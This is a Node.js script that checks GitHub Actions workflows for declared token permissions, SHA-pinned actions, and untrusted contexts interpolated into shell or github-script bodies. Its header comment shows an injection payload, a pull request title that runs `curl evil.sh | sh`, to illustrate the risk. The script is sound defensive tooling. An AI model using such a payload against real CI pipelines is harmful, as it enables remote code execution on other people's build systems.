/**
 * Checks that the workflows still hold the three properties SECURITY.md claims
 * for them.
 *
 * These are properties a change breaks by accident, not by intent, and every
 * one of them is invisible in review: a `uses:` pasted from a README carries a
 * tag rather than a SHA, a new workflow inherits whatever the repository's
 * default token permissions happen to be, and a `${{ }}` moved into a `run:`
 * block reads as a variable when it is really a paste of attacker-supplied
 * text into a shell.
 *
 * The last one is the sharp edge. `${{ github.event.pull_request.title }}` is
 * substituted as text before bash sees the line, so a pull request titled
 * `"; curl evil.sh | sh; #` runs. Passing the same value through `env:` is
 * safe, because the shell then reads it as data. Now that a push opens its own
 * pull request and a green run merges it, there is a path from a branch name
 * to the default branch, and that check stops being theoretical.
 *
 *   node scripts/check-workflow-hardening.mjs .github/workflows/*.yml
 */
import { readFileSync } from 'node:fs';
import { execFileSync } from 'node:child_process';

const files = process.argv.slice(2);
if (files.length === 0) {
  console.error('usage: check-workflow-hardening.mjs <workflow.yml...>');
  process.exit(1);
}

/** Workflow YAML, via Python - see the note in check-action-contracts.mjs. */
function parseYaml(path) {
  const out = execFileSync(
    'python3',
    ['-c', 'import sys,yaml,json;json.dump(yaml.safe_load(open(sys.argv[1])),sys.stdout)', path],
    { encoding: 'utf8' },
  );
  return JSON.parse(out);
}

/**
 * Contexts an outsider can write, which therefore must never be interpolated
 * into a shell command.
 *
 * Everything here is text somebody chooses: a branch name, a title, a body, a
 * dispatch input. `github.sha`, `env.*`, `secrets.*` and a step's own outputs
 * are not on the list - they are the repository talking to itself.
 */
const UNTRUSTED = [
  'github.event.',
  'github.head_ref',
  'github.ref_name',
  'github.actor',
  'github.triggering_actor',
  'inputs.',
];

const problems = [];
let steps = 0;

for (const file of files) {
  const text = readFileSync(file, 'utf8');
  const wf = parseYaml(file);

  // 1. A token whose scope is decided somewhere else is a token nobody
  //    reviewed. Declaring it here makes the blast radius part of the diff.
  if (wf.permissions === undefined) {
    problems.push(`${file}: no top-level 'permissions:'; the default token scope is a repo setting`);
  }

  for (const [jobName, job] of Object.entries(wf?.jobs ?? {})) {
    for (const step of job?.steps ?? []) {
      // 2. A tag is a pointer its owner can move. These workflows hold the npm
      //    and container credentials, so every third-party action is pinned to
      //    the commit it resolved to.
      if (typeof step?.uses === 'string') {
        steps += 1;
        const uses = step.uses;
        const local = uses.startsWith('./') || uses.startsWith('docker://');
        const ref = uses.includes('@') ? uses.slice(uses.lastIndexOf('@') + 1) : '';
        if (!local && !/^[0-9a-f]{40}$/.test(ref)) {
          problems.push(
            `${file} (${jobName}): ${uses} is not pinned to a commit SHA` +
              `\n    a tag can be moved by whoever owns the action`,
          );
        }
      }

      // 3. `${{ }}` is textual substitution, performed before the shell reads
      //    the line. Untrusted text belongs in `env:`, where the shell sees a
      //    variable rather than syntax.
      if (typeof step?.run === 'string') {
        for (const m of step.run.matchAll(/\$\{\{([^}]*)\}\}/g)) {
          const expr = m[1].trim();

          // GitHub scans a whole run block for expressions and has no idea
          // what a `#` means, so an empty one written inside a shell comment
          // is still an empty one - and the file is rejected at load time with
          // "An expression was expected", pointing at the block rather than at
          // the line. Which is exactly how a comment *about* not putting
          // expressions in run blocks took this workflow down.
          if (expr === '') {
            problems.push(
              `${file} (${jobName}): run: contains an empty expression` +
                '\n    GitHub refuses to load a workflow with one, even inside a shell comment',
            );
            continue;
          }

          const bad = UNTRUSTED.find((ctx) => expr.includes(ctx));
          if (bad) {
            problems.push(
              `${file} (${jobName}): run: interpolates ${expr}` +
                `\n    '${bad}' is text somebody else chooses; pass it through env: instead`,
            );
          }
        }
      }
    }
  }

  // A `run:` in a composite step or a `with: script:` body is not covered
  // above, so flag the one shape that hides a shell: actions/github-script is
  // JavaScript, but its `script:` is templated the same way.
  if (/github-script/.test(text)) {
    for (const m of text.matchAll(/\$\{\{([^}]*)\}\}/g)) {
      const expr = m[1].trim();
      const bad = UNTRUSTED.find((ctx) => expr.includes(ctx));
      if (bad && /script:/.test(text)) {
        problems.push(
          `${file}: uses actions/github-script and interpolates ${expr}` +
            `\n    read it from process.env inside the script instead`,
        );
      }
    }
  }
}

if (problems.length > 0) {
  console.error(`\n${problems.length} problem(s):\n`);
  for (const p of new Set(problems)) console.error(`  ${p}`);
  process.exit(1);
}

console.log(
  `${files.length} workflow(s), ${steps} action reference(s): ` +
    'permissions declared, actions pinned, no untrusted text in a shell.',
);
